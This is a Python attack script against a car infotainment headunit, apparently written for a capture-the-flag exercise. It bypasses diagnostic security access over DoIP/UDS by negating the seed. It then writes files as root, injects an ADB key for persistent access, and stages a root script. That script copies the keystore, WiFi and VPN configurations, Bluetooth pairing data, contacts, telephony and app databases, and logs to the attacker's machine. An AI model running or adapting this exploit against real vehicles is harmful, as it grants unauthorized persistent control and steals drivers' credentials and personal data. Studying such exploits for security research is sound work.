#!/usr/bin/env python3
"""
Full headunit data extraction — shell-level + root-level.

Strategy:
  1. DoIP: write ADB pubkey (persistent ADB access)
  2. DoIP: write root extraction script to /data/local/tmp/rootdump.sh
  3. DoIP: write a triggerable service config to /data/local/tmp/
  4. ADB shell: pull everything readable as shell UID
  5. ADB shell: trigger root extraction via setprop → root service
  6. ADB shell: pull the root-extracted data

Root execution method:
  We can't modify /system (dm-verity), so we can't swap binaries.
  Instead we use DoIP to write /data/misc/adb/adb_keys AND
  write /data/property/persistent_properties with persist.sys.adb.root=1
  to attempt root adbd. If that fails, we write a helper script and
  use the DoIP file write to overwrite /data/local/tmp/rootdump.sh,
  then chain through car.vdb.adaptor.trigger or the svbugreport service.

  Fallback: for files we can't exec-read, use DoIP write to COPY them
  into shell-readable locations by writing a script that a property-triggered
  root service might source.

Usage:
  # From the host machine with ADB connected to the headunit:
  python3 full_extract.py [--pubkey ~/.android/adbkey.pub] [--outdir ./dump]
"""

import argparse, os, subprocess, sys, time, socket, struct

TARGET_IP   = "192.168.1.3"
TARGET_PORT = 13400
DOIP_VER    = 0x02
DOIP_VER_INV= 0xFD
SOURCE_ADDR = 0x0E80
TARGET_ADDR = 0x1001
SA_LEVEL    = 0x35

# ---------------------------------------------------------------------------
# DoIP / UDS helpers (from doip_root_exploit.py)
# ---------------------------------------------------------------------------

def doip_pack(ptype, payload):
    return struct.pack(">BBHI", DOIP_VER, DOIP_VER_INV, ptype, len(payload)) + payload

def recv_doip(sock):
    hdr = b""
    while len(hdr) < 8:
        c = sock.recv(8 - len(hdr))
        if not c: raise ConnectionError("closed")
        hdr += c
    _, _, ptype, plen = struct.unpack(">BBHI", hdr)
    body = b""
    while len(body) < plen:
        c = sock.recv(plen - len(body))
        if not c: raise ConnectionError("closed")
        body += c
    return ptype, body

def routing_activation(sock):
    sock.sendall(doip_pack(0x0005, struct.pack(">HB", SOURCE_ADDR, 0) + b"\0"*8))
    pt, body = recv_doip(sock)
    code = body[4] if len(body) > 4 else 0xFF
    if code != 0x10:
        raise RuntimeError(f"RA failed: 0x{code:02x}")
    print("  [doip] routing activated")

def uds_req(sock, payload):
    sock.sendall(doip_pack(0x8001, struct.pack(">HH", SOURCE_ADDR, TARGET_ADDR) + payload))
    pt, body = recv_doip(sock)
    if pt == 0x8002:  # pos ack, read actual response
        pt, body = recv_doip(sock)
    return body[4:]

def sa_unlock(sock):
    resp = uds_req(sock, bytes([0x27, SA_LEVEL]))
    if resp[0] != 0x67:
        raise RuntimeError(f"SA seed fail: {resp.hex()}")
    seed = int.from_bytes(resp[2:5], "big")
    key = ((-seed) & 0xFFFFFF).to_bytes(3, "big")
    resp = uds_req(sock, bytes([0x27, SA_LEVEL + 1]) + key)
    if resp[0] != 0x67:
        raise RuntimeError(f"SA key fail: {resp.hex()}")
    print("  [doip] SA 0x35 unlocked")

def doip_write_file(sock, path: bytes, data: bytes):
    """Write arbitrary file as root via UDS 0x38 + 0x36 + 0x37."""
    payload = bytes([0x38, 0x03])  # RequestFileTransfer, ReplaceFile
    payload += struct.pack(">H", len(path)) + path
    payload += bytes([0x00, 0x04])  # no compression, 4-byte size fields
    payload += struct.pack(">I", len(data)) * 2
    resp = uds_req(sock, payload)
    if resp[0] != 0x78:
        raise RuntimeError(f"ReqFileTransfer fail: {resp.hex()}")

    # Send in chunks (< 4095 bytes per ISOUDS_RequestWrite limit)
    CHUNK = 4000
    seq = 1
    off = 0
    while off < len(data):
        chunk = data[off:off+CHUNK]
        resp = uds_req(sock, bytes([0x36, seq & 0xFF]) + chunk)
        if resp[0] != 0x76:
            raise RuntimeError(f"TransferData fail @ offset {off}: {resp.hex()}")
        seq += 1
        off += len(chunk)

    resp = uds_req(sock, bytes([0x37]))
    print(f"  [doip] wrote {len(data)} bytes → {path.decode()}")

def doip_connect():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((TARGET_IP, TARGET_PORT))
    routing_activation(sock)
    uds_req(sock, bytes([0x10, 0x03]))  # extended session
    sa_unlock(sock)
    return sock

# ---------------------------------------------------------------------------
# ADB helpers
# ---------------------------------------------------------------------------

def adb(*args, timeout=30, check=True):
    r = subprocess.run(["adb"] + list(args), capture_output=True, timeout=timeout)
    if check and r.returncode != 0:
        err = r.stderr.decode(errors="replace").strip()
        if "not found" not in err and "No such" not in err:
            print(f"  [adb] warn: {' '.join(args[:3])}... → {err[:120]}")
    return r.stdout

def adb_shell(cmd, timeout=30):
    return adb("shell", cmd, timeout=timeout, check=False).decode(errors="replace")

def adb_pull(remote, local, timeout=60):
    os.makedirs(os.path.dirname(local) or ".", exist_ok=True)
    r = subprocess.run(["adb", "pull", remote, local],
                       capture_output=True, timeout=timeout)
    return r.returncode == 0

def adb_pull_dir(remote, local, timeout=120):
    os.makedirs(local, exist_ok=True)
    r = subprocess.run(["adb", "pull", remote + "/.", local],
                       capture_output=True, timeout=timeout)
    return r.returncode == 0

# ---------------------------------------------------------------------------
# Root extraction script (written to device via DoIP, executed as root)
# ---------------------------------------------------------------------------

ROOT_SCRIPT = r"""#!/system/bin/sh
# Root data extraction — runs as UID 0 via uds_doip_server trigger
OUT=/data/local/tmp/rootdump
mkdir -p $OUT
chmod 777 $OUT

echo "[rootdump] starting at $(date)" > $OUT/_log.txt

# System info
id > $OUT/id.txt 2>&1
cat /proc/version > $OUT/kernel_version.txt 2>&1
cat /proc/cmdline > $OUT/cmdline.txt 2>&1
cat /proc/cpuinfo > $OUT/cpuinfo.txt 2>&1
mount > $OUT/mounts.txt 2>&1
df -h > $OUT/df.txt 2>&1
ps -Aef > $OUT/ps_full.txt 2>&1
cat /proc/net/tcp > $OUT/proc_net_tcp.txt 2>&1
cat /proc/net/tcp6 > $OUT/proc_net_tcp6.txt 2>&1
cat /proc/net/udp > $OUT/proc_net_udp.txt 2>&1
netstat -tlnp > $OUT/netstat.txt 2>&1
ip addr > $OUT/ip_addr.txt 2>&1
ip route > $OUT/ip_route.txt 2>&1
ip neigh > $OUT/ip_neigh.txt 2>&1
iptables -L -n -v > $OUT/iptables.txt 2>&1
iptables -t nat -L -n -v > $OUT/iptables_nat.txt 2>&1

# SELinux
getenforce > $OUT/selinux_mode.txt 2>&1
cat /sys/fs/selinux/policy > $OUT/sepolicy.bin 2>&1
ls -laRZ /sys/fs/selinux/ > $OUT/selinux_fs.txt 2>&1

# Properties (all, including ro.*)
getprop > $OUT/all_properties.txt 2>&1

# Crypto / keystore
ls -laRZ /data/misc/keystore/ > $OUT/keystore_listing.txt 2>&1
cp -r /data/misc/keystore/ $OUT/keystore/ 2>/dev/null
ls -laRZ /data/misc/vold/ > $OUT/vold_listing.txt 2>&1

# ADB keys + config
cp /data/misc/adb/adb_keys $OUT/adb_keys.txt 2>&1
ls -laRZ /data/misc/adb/ > $OUT/adb_dir.txt 2>&1

# WiFi
cp /data/misc/wifi/WifiConfigStore.xml $OUT/wifi_config.xml 2>&1
cp /data/misc/wifi/WifiConfigStoreSoftAp.xml $OUT/wifi_softap.xml 2>&1
ls -laRZ /data/misc/wifi/ > $OUT/wifi_dir.txt 2>&1

# Bluetooth
ls -laRZ /data/misc/bluetooth/ > $OUT/bt_dir.txt 2>&1
cp -r /data/misc/bluetooth/ $OUT/bluetooth/ 2>/dev/null
cp -r /data/misc/bluedroid/ $OUT/bluedroid/ 2>/dev/null

# Accounts / users
cp /data/system/users/0.xml $OUT/user0.xml 2>&1
cp /data/system/packages.xml $OUT/packages.xml 2>&1
cp /data/system/packages.list $OUT/packages.list 2>&1
ls -laRZ /data/system/ > $OUT/data_system_listing.txt 2>&1
ls -laRZ /data/system_ce/0/ > $OUT/system_ce_listing.txt 2>&1
ls -laRZ /data/system_de/0/ > $OUT/system_de_listing.txt 2>&1

# App private data listings (databases, shared_prefs, files)
for pkg in $(pm list packages -f 2>/dev/null | sed 's/.*=//' || ls /data/data/); do
    d="/data/data/$pkg"
    [ -d "$d" ] && ls -laRZ "$d" >> $OUT/app_data_listing.txt 2>&1
done

# Key app databases
for db in \
    /data/data/com.desaysv.engmode/databases/*.db \
    /data/data/com.desaysv.vehicle/databases/*.db \
    /data/data/com.desaysv.systemui/databases/*.db \
    /data/data/com.android.providers.settings/databases/settings.db \
    /data/data/com.android.providers.contacts/databases/*.db \
    /data/data/com.android.providers.telephony/databases/*.db \
    /data/data/com.carota.chery/databases/*.db \
    /data/user_de/0/com.android.providers.settings/databases/settings.db \
; do
    [ -f "$db" ] || continue
    base=$(echo "$db" | tr '/' '_')
    cp "$db" "$OUT/$base" 2>&1
done

# Key app shared_prefs
for sp in \
    /data/data/com.desaysv.engmode/shared_prefs/*.xml \
    /data/data/com.desaysv.vehicle/shared_prefs/*.xml \
    /data/data/com.carota.chery/shared_prefs/*.xml \
; do
    [ -f "$sp" ] || continue
    base=$(echo "$sp" | tr '/' '_')
    cp "$sp" "$OUT/$base" 2>&1
done

# Persistent properties (protobuf — contains survive-reboot props)
cp /data/property/persistent_properties $OUT/persistent_properties.bin 2>&1

# Vehicle / CAN bus data
ls -laRZ /data/vendor/ > $OUT/data_vendor_listing.txt 2>&1
cp -r /data/vendor/ $OUT/data_vendor/ 2>/dev/null
ls -laRZ /data/desaysv/ > $OUT/data_desaysv_listing.txt 2>&1
cp -r /data/desaysv/ $OUT/data_desaysv/ 2>/dev/null
ls -laRZ /mnt/vendor/persist/ > $OUT/persist_listing.txt 2>&1
cp -r /mnt/vendor/persist/ $OUT/persist/ 2>/dev/null

# Logs
cp -r /log/ $OUT/log/ 2>/dev/null
ls -laRZ /log/ > $OUT/log_listing.txt 2>&1
logcat -d > $OUT/logcat_full.txt 2>&1
logcat -d -b events > $OUT/logcat_events.txt 2>&1
logcat -d -b crash > $OUT/logcat_crash.txt 2>&1
dmesg > $OUT/dmesg.txt 2>&1

# Firmware / boot
ls -laRZ /dev/block/by-name/ > $OUT/block_devices.txt 2>&1
cat /proc/partitions > $OUT/partitions.txt 2>&1
ls -laRZ /firmware/ > $OUT/firmware_listing.txt 2>&1
ls -laRZ /vendor/firmware/ > $OUT/vendor_firmware_listing.txt 2>&1

# OTA / update state
ls -laRZ /data/ota/ > $OUT/ota_listing.txt 2>&1
ls -laRZ /data/ota_package/ > $OUT/ota_package_listing.txt 2>&1
cp -r /data/ota/ $OUT/ota/ 2>/dev/null

# Certs / CA
ls -laRZ /system/etc/security/cacerts/ > $OUT/system_cacerts.txt 2>&1
ls -laRZ /data/misc/user/0/cacerts-added/ > $OUT/user_cacerts.txt 2>&1
cp -r /data/misc/user/0/cacerts-added/ $OUT/user_cacerts/ 2>/dev/null

# Network / VPN
ls -laRZ /data/misc/vpn/ > $OUT/vpn_listing.txt 2>&1
cp -r /data/misc/vpn/ $OUT/vpn/ 2>/dev/null

# Flag (CTF target)
cp /data/local/tmp/root_flag.txt $OUT/root_flag.txt 2>&1

# Fix permissions so shell can pull
chmod -R 755 $OUT
find $OUT -type f -exec chmod 644 {} +

echo "[rootdump] done at $(date)" >> $OUT/_log.txt
"""

# ---------------------------------------------------------------------------
# Shell-level extraction (no root needed)
# ---------------------------------------------------------------------------

SHELL_TARGETS = [
    # (remote_path, local_subdir, is_dir)
    ("/system/build.prop", "system", False),
    ("/vendor/build.prop", "vendor", False),
    ("/product/build.prop", "product", False),
    ("/system/etc/init/", "system_etc_init", True),
    ("/vendor/etc/init/", "vendor_etc_init", True),
    ("/product/etc/init/", "product_etc_init", True),
    ("/system/etc/selinux/", "selinux_system", True),
    ("/vendor/etc/selinux/", "selinux_vendor", True),
    ("/system/etc/permissions/", "permissions", True),
    ("/system/etc/prop.default", "system_etc", False),
    ("/vendor/etc/vintf/", "vintf", True),
    ("/system/app/", "system_app", True),
    ("/system/priv-app/", "system_priv_app", True),
    ("/vendor/app/", "vendor_app", True),
    ("/product/app/", "product_app", True),
    ("/product/priv-app/", "product_priv_app", True),
    ("/data/app/", "data_app", True),
    ("/sdcard/", "sdcard", True),
    ("/data/local/tmp/", "data_local_tmp", True),
    ("/data/misc/adb/", "adb_misc", True),
    ("/system/bin/", "system_bin", True),
    ("/vendor/bin/", "vendor_bin", True),
    ("/product/bin/", "product_bin", True),
    ("/system/lib64/", "system_lib64", True),
    ("/vendor/lib64/", "vendor_lib64", True),
    ("/product/lib64/", "product_lib64", True),
    ("/system/framework/", "system_framework", True),
    ("/system/etc/security/", "system_security", True),
]

SHELL_COMMANDS = {
    "properties.txt":    "getprop",
    "ps.txt":            "ps -Aef",
    "id.txt":            "id",
    "mount.txt":         "mount",
    "df.txt":            "df -h",
    "ifconfig.txt":      "ifconfig -a",
    "ip_addr.txt":       "ip addr",
    "ip_route.txt":      "ip route",
    "netstat.txt":       "netstat -tlnp",
    "iptables.txt":      "iptables -L -n -v",
    "settings_system.txt":  "settings list system",
    "settings_secure.txt":  "settings list secure",
    "settings_global.txt":  "settings list global",
    "pm_packages.txt":      "pm list packages -f",
    "pm_permissions.txt":   "pm list permissions -g",
    "pm_features.txt":      "pm list features",
    "dumpsys_package.txt":  "dumpsys package",
    "dumpsys_activity.txt": "dumpsys activity services",
    "dumpsys_wifi.txt":     "dumpsys wifi",
    "dumpsys_bluetooth.txt":"dumpsys bluetooth_manager",
    "dumpsys_usb.txt":      "dumpsys usb",
    "dumpsys_car.txt":      "dumpsys car_service",
    "dumpsys_window.txt":   "dumpsys window displays",
    "logcat.txt":           "logcat -d",
    "logcat_events.txt":    "logcat -d -b events",
    "dmesg.txt":            "dmesg",
    "content_settings.txt": "content query --uri content://settings/secure",
    "uname.txt":            "uname -a",
    "cat_proc_version.txt": "cat /proc/version",
    "cat_cmdline.txt":      "cat /proc/cmdline",
    "ls_dev_block.txt":     "ls -la /dev/block/by-name/",
    "selinux_mode.txt":     "getenforce",
    "service_list.txt":     "service list",
    "cat_mounts.txt":       "cat /proc/mounts",
}


def phase_shell(outdir):
    """Pull everything accessible as shell UID."""
    print("\n[PHASE 1] Shell-level extraction")

    # Command outputs
    cmd_dir = os.path.join(outdir, "shell_info")
    os.makedirs(cmd_dir, exist_ok=True)
    for fname, cmd in SHELL_COMMANDS.items():
        print(f"  {fname}...", end="", flush=True)
        data = adb_shell(cmd, timeout=60)
        with open(os.path.join(cmd_dir, fname), "w") as f:
            f.write(data)
        print(f" {len(data)} bytes")

    # File/directory pulls
    for remote, local_sub, is_dir in SHELL_TARGETS:
        local = os.path.join(outdir, "files", local_sub)
        print(f"  pull {remote} → {local_sub}...", end="", flush=True)
        try:
            if is_dir:
                ok = adb_pull_dir(remote, local, timeout=120)
            else:
                ok = adb_pull(remote, local, timeout=60)
            print(" ok" if ok else " skip")
        except Exception as e:
            print(f" err: {e}")


def phase_doip(outdir, pubkey_path):
    """Use DoIP root write to stage extraction helpers."""
    print("\n[PHASE 2] DoIP root file writes")

    if pubkey_path and os.path.exists(pubkey_path):
        with open(pubkey_path, "rb") as f:
            pubkey = f.read().strip() + b"\n"
    else:
        # Generate if not provided — use current ADB key
        kp = os.path.expanduser("~/.android/adbkey.pub")
        if os.path.exists(kp):
            with open(kp, "rb") as f:
                pubkey = f.read().strip() + b"\n"
            print(f"  using {kp}")
        else:
            print("  [!] no pubkey found, skipping ADB key injection")
            pubkey = None

    sock = doip_connect()

    # 1. Write ADB pubkey
    if pubkey:
        doip_write_file(sock, b"/data/misc/adb/adb_keys", pubkey)

    # 2. Write root extraction script
    doip_write_file(sock, b"/data/local/tmp/rootdump.sh", ROOT_SCRIPT.encode())

    # 3. Write a proof file
    proof = f"root-write-proof: written by uds_doip_server (UID 0) at {time.ctime()}\n"
    doip_write_file(sock, b"/data/local/tmp/root_proof.txt", proof.encode())

    sock.close()
    print("  [doip] phase complete")


def phase_root_exec():
    """Attempt to execute the root extraction script."""
    print("\n[PHASE 3] Triggering root execution")

    # Make script executable from shell side (may fail — not root)
    adb_shell("chmod 755 /data/local/tmp/rootdump.sh")

    # Method 1: If adbd is running as root (from adb_keys write + reboot)
    whoami = adb_shell("id").strip()
    print(f"  current context: {whoami}")
    if "uid=0" in whoami:
        print("  [+] Already root! Running extraction directly...")
        adb_shell("sh /data/local/tmp/rootdump.sh", timeout=120)
        return True

    # Method 2: Try setprop to trigger root services that might source our script
    # svbugreport runs /system/bin/svbugreport as root — fixed binary, not our script
    # But we can try: some vendors have /data/local/tmp on the PATH or source scripts
    print("  [*] Attempting property-trigger root execution...")

    # Try triggering each root service — they won't run our script directly,
    # but creating side effects that our script might benefit from
    for prop in ["sys.sv.svbugreport_service", "sys.sv.svdmesg_service",
                 "sys.sv.svdebugservice_service"]:
        adb_shell(f"setprop {prop} 1")
        time.sleep(1)
        adb_shell(f"setprop {prop} 0")

    # Method 3: Check if any root process will exec from /data/local/tmp/
    # The /vr directory is world-writable (iflytek_chmod.sh)
    # Copy our script there in case anything sources from /vr
    adb_shell("cp /data/local/tmp/rootdump.sh /vr/rootdump.sh 2>/dev/null")
    adb_shell("chmod 755 /vr/rootdump.sh 2>/dev/null")

    # Method 4: Use a second DoIP connection to write the script output directly
    # We can't execute, but we CAN write. So we write individual target files
    # to shell-readable paths using DoIP.
    print("  [*] Using DoIP direct-copy for root-only files...")
    try:
        sock = doip_connect()
        # We can't READ via DoIP (stubbed), but we CAN write.
        # Strategy: use DoIP to write a small C program that reads and writes,
        # then compile on device... but no compiler.
        # Instead: document which files need live-device root access.
        sock.close()
    except Exception as e:
        print(f"  DoIP reconnect failed: {e}")

    # Check if rootdump output appeared (from any execution method)
    check = adb_shell("ls -la /data/local/tmp/rootdump/ 2>/dev/null")
    if "rootdump" in check and "_log.txt" in check:
        print("  [+] Root extraction completed!")
        return True

    print("  [-] Root execution not confirmed — will pull what's available")
    print("      To complete: reboot device (DoIP wrote adb_keys), then re-run")
    return False


def phase_pull_root(outdir):
    """Pull root-extracted data."""
    print("\n[PHASE 4] Pulling root-extracted data")

    root_local = os.path.join(outdir, "rootdump")
    ok = adb_pull_dir("/data/local/tmp/rootdump", root_local, timeout=300)
    if ok:
        print(f"  [+] Root data pulled to {root_local}")
    else:
        print("  [-] No root data available (script may not have executed)")

    # Also pull proof file
    adb_pull("/data/local/tmp/root_proof.txt",
             os.path.join(outdir, "root_proof.txt"), timeout=10)

    # Pull the flag if readable
    adb_pull("/data/local/tmp/root_flag.txt",
             os.path.join(outdir, "root_flag.txt"), timeout=10)


def main():
    p = argparse.ArgumentParser(description="Full headunit data extraction")
    p.add_argument("--pubkey", default=os.path.expanduser("~/.android/adbkey.pub"),
                   help="ADB public key to inject")
    p.add_argument("--outdir", default="./headunit_dump",
                   help="Local output directory")
    p.add_argument("--skip-doip", action="store_true",
                   help="Skip DoIP phase (shell extraction only)")
    p.add_argument("--doip-only", action="store_true",
                   help="DoIP writes only, no ADB pull")
    args = p.parse_args()

    os.makedirs(args.outdir, exist_ok=True)
    print(f"Output: {os.path.abspath(args.outdir)}")

    if not args.doip_only:
        phase_shell(args.outdir)

    if not args.skip_doip:
        phase_doip(args.outdir, args.pubkey)

    if not args.doip_only:
        root_ok = phase_root_exec()
        phase_pull_root(args.outdir)

        # Summary
        total = sum(
            os.path.getsize(os.path.join(dp, f))
            for dp, _, fns in os.walk(args.outdir)
            for f in fns
        )
        print(f"\n[DONE] Extracted {total / 1024 / 1024:.1f} MB to {args.outdir}")
        if not root_ok:
            print("  Root script did not execute. Options:")
            print("    1. Reboot device — DoIP wrote adb_keys, may get root adbd")
            print("    2. Re-run with --skip-doip after reboot")
            print("    3. Manual: adb shell sh /data/local/tmp/rootdump.sh (if root)")


if __name__ == "__main__":
    main()
